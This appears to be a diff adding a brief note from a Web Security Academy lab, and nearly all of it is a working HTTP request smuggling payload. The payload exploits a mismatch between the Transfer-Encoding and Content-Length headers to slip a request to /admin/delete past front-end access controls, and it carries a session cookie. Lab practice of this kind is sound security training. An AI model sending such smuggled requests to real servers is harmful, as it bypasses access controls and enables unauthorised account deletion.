@@ -1,0 +1,22 @@
+using the following i was able to get around the admin permissions set by the front end:
+
+"
+POST / HTTP/1.1
+Host: 0a00006504a898388021f82f00680075.web-security-academy.net
+Cookie: session=UwdqHFugoMuggxrsqvgCkppVxxXOJSBS
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Content-Type: application/x-www-form-urlencoded
+Transfer-Encoding: chunked
+Content-Length: 152
+Connection: keep-alive
+
+0
+
+GET /admin/delete?username=carlos HTTP/1.1
+Host: localhost
+X-Ignore: X
+Content-Type: application/x-www-form-urlencoded
+content-length: 10
+
+x=
+"
